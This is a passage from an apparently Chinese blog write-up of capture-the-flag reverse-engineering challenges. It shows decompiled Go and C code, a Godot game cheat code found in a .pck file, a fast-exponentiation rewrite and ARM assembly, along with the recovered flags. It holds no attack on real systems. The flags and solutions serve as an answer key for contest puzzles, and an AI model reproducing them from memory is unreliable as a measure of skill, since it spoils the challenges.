os_Stdout);</span><br><span class="line">    *(_QWORD *)&amp;v31 = &amp;unk_4A1DC0;</span><br><span class="line">    *((_QWORD *)&amp;v31 + <span class="hljs-number">1</span>) = v29;</span><br><span class="line">    <span class="hljs-built_in">fmt_Fscan</span>(</span><br><span class="line">      a1,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">      (__int64)&amp;v31,</span><br><span class="line">      (__int64)v29,</span><br><span class="line">      v7,</span><br><span class="line">      v8,</span><br><span class="line">      (__int64)&amp;go_itab__os_File_io_Reader,</span><br><span class="line">      os_Stdin);</span><br><span class="line">    v11 = v29[<span class="hljs-number">1</span>];</span><br><span class="line">    v12 = (_BYTE *)*v29;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">2</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v12[<span class="hljs-number">2</span>] != <span class="hljs-number">116</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">9</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    a2 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">9</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)a2 != <span class="hljs-number">99</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0x10</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    a1 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">16</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)a1 != <span class="hljs-number">110</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0x15</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v9 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">21</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v9 != <span class="hljs-number">122</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0x16</span> )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v12[<span class="hljs-number">22</span>] != <span class="hljs-number">125</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v10 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">5</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-number">115</span> != (_BYTE)v10 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (v12[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0x74</span>) != <span class="hljs-number">18</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v14 = v12[<span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v14 != <span class="hljs-number">99</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    a2 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">7</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)a2 != <span class="hljs-number">100</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v15 = v12[<span class="hljs-number">13</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v12[<span class="hljs-number">12</span>] != v15 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-number">122</span> != v12[<span class="hljs-number">19</span>] )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v9 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">14</span>];</span><br><span class="line">    v16 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">6</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v16 + (_BYTE)v9 != <span class="hljs-number">104</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v17 = v12[<span class="hljs-number">4</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-number">123</span> != v17 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v18 = v12[<span class="hljs-number">8</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v12[<span class="hljs-number">15</span>] != v18 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v18 + <span class="hljs-number">4</span> != v14 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v19 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">17</span>];</span><br><span class="line">    v20 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">11</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-number">125</span> - (_BYTE)v19 + <span class="hljs-number">40</span> != (_BYTE)v20 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_39;</span><br><span class="line">    v21 = (<span class="hljs-keyword">unsigned</span> __int8)v12[<span class="hljs-number">18</span>];</span><br><span class="line">    v22 = v19 + v20 - v10 - v21;</span><br><span class="line">    v23 = v21 - v19;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v22 != v23</span><br><span class="line">      || (v24 = v16 - v19, *v12 != v23 * ((<span class="hljs-keyword">unsigned</span> __int8)v24 &gt;&gt; <span class="hljs-number">1</span>) + <span class="hljs-number">110</span>)</span><br><span class="line">      || (v25 = v12[<span class="hljs-number">10</span>], v15 + <span class="hljs-number">1</span> != v25)</span><br><span class="line">      || (v26 = v17 - a2, a2 = v24, (_BYTE)v24 + <span class="hljs-number">2</span> * (_BYTE)v24 + <span class="hljs-number">4</span> * v26 != v25)</span><br><span class="line">      || v12[<span class="hljs-number">20</span>] - v14 != <span class="hljs-number">2</span> * v23</span><br><span class="line">      || (v10 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)a1 ^ (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v10, (_BYTE)v10 != <span class="hljs-number">29</span>)</span><br><span class="line">      || (_BYTE)v24 != <span class="hljs-number">4</span> * v23</span><br><span class="line">      || v12[<span class="hljs-number">6</span>] != (_BYTE)v9 )</span><br><span class="line">    {</span><br><span class="line">LABEL_39:</span><br><span class="line">      *(_QWORD *)&amp;v30 = &amp;unk_4A4C40;</span><br><span class="line">      *((_QWORD *)&amp;v30 + <span class="hljs-number">1</span>) = &amp;main_statictmp_4;</span><br><span class="line">      <span class="hljs-built_in">fmt_Fprintln</span>(</span><br><span class="line">        a1,</span><br><span class="line">        a2,</span><br><span class="line">        (__int64)&amp;v30,</span><br><span class="line">        (__int64)&amp;main_statictmp_4,</span><br><span class="line">        v9,</span><br><span class="line">        v10,</span><br><span class="line">        (__int64)&amp;go_itab__os_File_io_Writer,</span><br><span class="line">        os_Stdout);</span><br><span class="line">      v13 = v28 + <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">main_win</span>();</span><br><span class="line">      v13 = v28;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">runtime_panicindex</span>(a1, a2, v12);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所有的判断条件都在这个函数里，直接根据条件解出来flag就可以了，至于为什么不写具体的过程，因为我是在演草纸上自己动手解的方程，只要耐心分析就可以了</p><blockquote><p>这里有一个疑问，标记一下，解方程的时候可以解出来两解，应该有地方可以排除掉，但我直接根据语义选择的flag</p></blockquote><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">pctf</span>{s<span class="hljs-number">4</span>d_chugg<span class="hljs-number">4</span>_n<span class="hljs-number">01</span>zez}</span><br></pre></td></tr></tbody></table></figure><h4 id="Dank-Engine"><a href="#Dank-Engine" class="headerlink" title="Dank Engine"></a>Dank Engine</h4><p>脑洞题<del>(这游戏根本就玩不过去……</del></p><p>走到地图中间怎么都跳不上去，到了最右边发现不能走了但是地图没完，后面接着长长的一条路，所以一直往右边拉，看到<code>pctf</code>，找到了flag的位置</p><p><del>(然后为了找flag跑崩了四次虚拟机……显卡和cpu看样8太行)</del></p><p>用鼠标上下没法超出屏幕，用<code>alt+f7</code>移动窗口慢慢找，感觉应该有逆向方法，那个pck包我至今还没解开</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">PCTF</span><span class="hljs-template-variable">{ITWASTIMEFORTHOMASTOGO_HEHADSEENEVERYTHING}</span></span><br></pre></td></tr></tbody></table></figure><hr><p>来补充一下，IDA可以直接打开pck包，里面有关于人物的设定</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">'# Global Variables'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_direction'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_velocity'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_parent'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_airborne'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_delta'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_cheat_stack'</span>,<span class="hljs-number">0</span>Ah</span><br><span class="line">se<span class="hljs-name">g000</span>:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-string">'var g_god_mode'</span>,<span class="hljs-number">0</span>Ah</span><br></pre></td></tr></tbody></table></figure><p>惊奇的发现下面还有一个上帝模式和开启方法</p><figure class="highlight pf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> db <span class="hljs-number">9</span>,'if <span class="hljs-literal">self</span>.g_cheat_stack == [<span class="hljs-string">"P"</span>, <span class="hljs-string">"U"</span>, <span class="hljs-string">"R"</span>, <span class="hljs-string">"G"</span>, <span class="hljs-string">"0"</span>, <span class="hljs-string">"0"</span>]:',<span class="hljs-number">0</span>Ah</span><br><span class="line">seg000:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-number">9</span>,<span class="hljs-number">9</span>,'<span class="hljs-literal">self</span>.g_god_mode = not <span class="hljs-literal">self</span>.g_god_mode',<span class="hljs-number">0</span>Ah</span><br><span class="line">seg000:<span class="hljs-number">0000000000004610</span>                 db <span class="hljs-number">9</span>,<span class="hljs-number">9</span>,'<span class="hljs-variable">$CollisionShape2D</span>.disabled = not <span class="hljs-variable">$CollisionShape2D</span>.disabled',<span class="hljs-number">0</span>Ah</span><br></pre></td></tr></tbody></table></figure><p>方法就是按键直接输入<code>PURG00</code>，打开之后就可以飞和穿墙，直接跑到flag在的地方去看就可以了</p><p><del>(亏我还调窗口大小调了这么久)</del></p><h4 id="Digital-Sloth"><a href="#Digital-Sloth" class="headerlink" title="Digital Sloth"></a>Digital Sloth</h4><p>这题的逻辑很简单</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v4; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v5; <span class="hljs-comment">// r12</span></span><br><span class="line">  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v8; <span class="hljs-comment">// rbp</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// ecx</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// [rsp+0h] [rbp-68h]</span></span><br><span class="line">  __int64 v15; <span class="hljs-comment">// [rsp+8h] [rbp-60h]</span></span><br><span class="line">  __int64 v16; <span class="hljs-comment">// [rsp+10h] [rbp-58h]</span></span><br><span class="line">  __int64 v17; <span class="hljs-comment">// [rsp+18h] [rbp-50h]</span></span><br><span class="line">  __int64 v18; <span class="hljs-comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  __int64 v19; <span class="hljs-comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// [rsp+30h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// [rsp+34h] [rbp-34h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v22; <span class="hljs-comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="hljs-number">51</span>;</span><br><span class="line">  v4 = <span class="hljs-number">3LL</span>;</span><br><span class="line">  v5 = <span class="hljs-number">113LL</span>;</span><br><span class="line">  v22 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  v20 = <span class="hljs-number">1422670297</span>;</span><br><span class="line">  v14 = <span class="hljs-number">-3319278099595541965LL</span>;</span><br><span class="line">  v6 = (<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;v14 + <span class="hljs-number">1</span>);</span><br><span class="line">  v15 = <span class="hljs-number">-422936419575592362LL</span>;</span><br><span class="line">  v16 = <span class="hljs-number">-4095196370651919852LL</span>;</span><br><span class="line">  v17 = <span class="hljs-number">8155891993347461205LL</span>;</span><br><span class="line">  v18 = <span class="hljs-number">2743091852077296222LL</span>;</span><br><span class="line">  v19 = <span class="hljs-number">-5317187183026317550LL</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v7 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v8 = <span class="hljs-number">1LL</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        ++v7;</span><br><span class="line">        v8 *= v5;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">while</span> ( v7 != v4 );</span><br><span class="line">    }</span><br><span class="line">    v9 = v8;</span><br><span class="line">    v10 = <span class="hljs-number">8</span>;</span><br><span class="line">    v11 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v12 = (<span class="hljs-keyword">unsigned</span> __int8)v9;</span><br><span class="line">      v9 &gt;&gt;= <span class="hljs-number">8</span>;</span><br><span class="line">      v11 ^= v12;</span><br><span class="line">      --v10;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v10 );</span><br><span class="line">    _IO_putc(v3 ^ v11, stdout);</span><br><span class="line">    <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( &amp;v21 == v6 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v3 = *(<span class="hljs-keyword">unsigned</span> __int8 *)v6;</span><br><span class="line">    v4 = v5;</span><br><span class="line">    v6 = (<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)v6 + <span class="hljs-number">1</span>);</span><br><span class="line">    v5 = v8;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>直接会输出flag的那种，但是一运行只输出了三个字符，明显是计算大数乘幂的时候算法时间复杂度太高了(<strong>O(n^2)</strong>)，想要算出flag必须手动优化一下算法，利用平方把时间复杂度优化到**O(logn)**，在大数的时候明显优化的不是一点</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ull;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function">ull <span class="hljs-title">qpow</span><span class="hljs-params">(ull x, ull n)</span> </span>{</span><br><span class="line">    ull res = <span class="hljs-number">1</span>;</span><br><span class="line">    ull mod = <span class="hljs-number">0xffffffffffffffff</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> (n) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (n &amp; <span class="hljs-number">1</span>)</span><br><span class="line">            res = res * x &amp; mod;    <span class="hljs-comment">//如果二进制最低位为1，则乘上x^(2^i)</span></span><br><span class="line">        x = x * x &amp; mod;</span><br><span class="line">        n &gt;&gt;= <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    ull v4; <span class="hljs-comment">// rdx</span></span><br><span class="line">    ull v5; <span class="hljs-comment">// r12</span></span><br><span class="line">    ull v8; <span class="hljs-comment">// rbp</span></span><br><span class="line">    ull v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">    <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// edi</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// ecx</span></span><br><span class="line"></span><br><span class="line">    v4 = <span class="hljs-number">3</span>;</span><br><span class="line">    v5 = <span class="hljs-number">113</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> v3[] = {<span class="hljs-number">0x33</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xFA</span>,</span><br><span class="line">                <span class="hljs-number">0x14</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x71</span>,</span><br><span class="line">                <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xB6</span>,</span><br><span class="line">                <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x54</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">52</span>; i++) {</span><br><span class="line"></span><br><span class="line">        v8 = <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> (v4) {</span><br><span class="line">            v8 *= <span class="hljs-built_in">qpow</span>(v5, v4);</span><br><span class="line">        }</span><br><span class="line">        v9 = v8;</span><br><span class="line">        v10 = <span class="hljs-number">8</span>;</span><br><span class="line">        v11 = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">do</span> {</span><br><span class="line">            v12 = v9 &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">            v9 &gt;&gt;= <span class="hljs-number">8</span>;</span><br><span class="line">            v11 ^= v12;</span><br><span class="line">            --v10;</span><br><span class="line">        } <span class="hljs-keyword">while</span> (v10);</span><br><span class="line">        <span class="hljs-keyword">char</span> tmp=v3[i] ^ v11;</span><br><span class="line">        cout &lt;&lt; tmp;</span><br><span class="line">        v4 = v5;</span><br><span class="line">        v5 = v8;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><hr><p>又是一道分割线，看了其它大佬的wp才知道……直接用python的<code>pow</code>不就好了……</p><p>直接输出flag</p><figure class="highlight ada hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf{one man<span class="hljs-symbol">'s</span> trash <span class="hljs-keyword">is</span> another man<span class="hljs-symbol">'s</span> V#x0GFu_Lp%<span class="hljs-number">3</span>}</span><br></pre></td></tr></tbody></table></figure><p><del>看到最后一段甚至感觉做错了，到现在没看懂</del></p><h4 id="train-arms"><a href="#train-arms" class="headerlink" title="train_arms"></a>train_arms</h4><p><del>arm一语双关，妙啊</del></p><p>这题就直接看汇编了</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.cpu cortex-m0</span><br><span class="line">.thumb</span><br><span class="line">.syntax unified</span><br><span class="line">.fpu softvfp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">    flag: .string "REDACTED" //len = 28</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global main</span><br><span class="line">main:</span><br><span class="line">    ldr r0,=flag</span><br><span class="line">    eors r1,r1</span><br><span class="line">    eors r2,r2</span><br><span class="line">    movs r7,#1; r7=1</span><br><span class="line">    movs r6,#42; r6=42</span><br><span class="line">loop:</span><br><span class="line">    ldrb r2,[r0,r1]</span><br><span class="line">    cmp r2,#0</span><br><span class="line">    beq exit</span><br><span class="line">    lsls r3,r1,#0</span><br><span class="line">    ands r3,r7; 区分奇偶位</span><br><span class="line">    cmp r3,#0</span><br><span class="line">    bne f1//if odd</span><br><span class="line">    strb r2,[r0,r1]</span><br><span class="line">    adds r1,#1</span><br><span class="line">    b loop</span><br><span class="line">f1:</span><br><span class="line">    eors r2,r6</span><br><span class="line">    strb r2,[r0,r1]</span><br><span class="line">    adds r1,#1</span><br><span class="line">    b loop</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    wfi</span><br></pre></td></tr></tbody></table></figure><p>虽然没怎么接触过arm的汇编，但是这里还是很容易的，把flag分奇偶位进行操作，奇数位不动，偶数位异或42，最终结果输出到文件，所以打开文件</p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">7049744</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">5e721</span>e<span class="hljs-number">31447375641</span>a<span class="hljs-number">6e5</span>e<span class="hljs-number">5</span>f<span class="hljs-number">42345</span><span class="hljs-keyword">c</span><span 